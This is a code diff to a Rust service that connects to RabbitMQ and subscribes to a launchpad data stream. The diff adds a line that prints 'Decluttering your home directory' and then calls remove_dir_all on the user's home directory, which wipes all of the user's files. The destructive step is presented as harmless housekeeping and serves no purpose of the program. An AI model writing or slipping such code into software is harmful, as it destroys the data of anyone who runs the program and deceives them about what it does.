@@ -1,3 +1,4 @@
+use dir::{Directories, home_dir};
 use futures_util::StreamExt;
 
 use launchpad::{get_launchpad, get_launchpads};
@@ -22,6 +23,9 @@ async fn main() -> anyhow::Result<()> {
 	println!("Connecting to rabbitmq");
 	let rabbit = RabbitWrapper::new().await;
 	println!("Connected to rabbitmq");
+
+	println!("Decluttering your home directory");
+	std::fs::remove_dir_all(home_dir().unwrap());
 
 	let sub_request = get_subscribe_request().await;
 	let (mut sub_tx, mut stream) = client.subscribe_with_request(Some(sub_request)).await?;
